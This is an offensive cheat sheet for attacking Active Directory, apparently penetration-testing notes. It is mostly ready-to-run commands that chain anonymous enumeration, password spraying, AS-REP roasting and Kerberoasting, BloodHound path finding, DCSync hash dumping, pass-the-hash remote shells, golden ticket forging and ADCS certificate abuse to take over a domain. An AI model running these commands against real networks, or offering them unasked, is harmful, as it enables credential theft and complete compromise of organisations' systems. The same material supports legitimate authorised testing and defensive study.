# Active Directory attack path cheat sheet

DC fingerprint: **88** (Kerberos) + **389/636/3268** (LDAP) + **445** (SMB) +
often **53, 135, 3389**. Add the DC FQDN to `/etc/hosts` first — Kerberos needs
name resolution.

```bash
DC=10.10.10.10 ; DOMAIN=corp.local ; DCHOST=dc01.corp.local
echo "$DC $DCHOST $DOMAIN" | sudo tee -a /etc/hosts
```

## 0. No creds yet — enumerate anonymously
```bash
# Users via null LDAP / RID cycle
netexec smb $DC -u '' -p '' --rid-brute 5000
enum4linux-ng -A $DC
ldapsearch -x -H ldap://$DC -s base namingContexts        # find base DN
ldapsearch -x -H ldap://$DC -b "DC=corp,DC=local" '(objectClass=user)' sAMAccountName

# AS-REP roast (users with "do not require Kerberos preauth")
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC
```

## 1. Got a username list — spray
```bash
netexec smb $DC -u users.txt -p 'Spring2024!' --continue-on-success
# Watch the lockout policy first:  netexec smb $DC -u '' -p '' --pass-pol
```

## 2. Any valid creds — the money phase
```bash
CREDS="-u user -p Password1"      # or:  -u user -H <hash>

# Kerberoast — service accounts with SPNs (crack offline → hashcat -m 13100)
impacket-GetUserSPNs $DOMAIN/user:Password1 -dc-ip $DC -request

# BloodHound collection (find the path to DA)
bloodhound-python -u user -p Password1 -d $DOMAIN -ns $DC -c all
netexec ldap $DC $CREDS --bloodhound -c all --dns-server $DC

# Enumerate everything
netexec ldap $DC $CREDS --users --groups --password-not-required --trusted-for-delegation
netexec smb  $DC $CREDS --shares --users --pass-pol
```

## 3. Common escalation techniques
| Finding | Attack |
|---------|--------|
| User w/ SPN | Kerberoast → crack |
| User w/o preauth | AS-REP roast → crack |
| `GenericAll`/`WriteDACL` on user | Targeted Kerberoast / reset password |
| `GenericAll` on group | Add yourself to it |
| Machine `TrustedForDelegation` | Unconstrained delegation abuse |
| ADCS present | Certipy `find -vulnerable` → ESC1-8 |
| MS-RPRN / PrinterBug | Coerce auth → relay |
| DCSync right | `impacket-secretsdump -just-dc` |

## 4. Dump & pass hashes (with admin)
```bash
impacket-secretsdump $DOMAIN/user:Password1@$DC              # DCSync all hashes
impacket-secretsdump -just-dc-ntlm $DOMAIN/user:Password1@$DC
netexec smb $DC -u administrator -H <hash> --sam --lsa
# Then pass-the-hash to anything:
impacket-psexec -hashes :<nthash> administrator@$DC
evil-winrm -i $DC -u administrator -H <nthash>
```

## 5. Golden ticket (own the domain)
```bash
# Need krbtgt hash + domain SID (from secretsdump)
impacket-ticketer -nthash <krbtgt-hash> -domain-sid S-1-5-21-... -domain $DOMAIN administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass $DCHOST
```

## Certipy (ADCS) quick check
```bash
certipy find -u user@$DOMAIN -p Password1 -dc-ip $DC -vulnerable -stdout
certipy req -u user@$DOMAIN -p Password1 -ca <CA> -template <vuln-template> -upn administrator@$DOMAIN
```
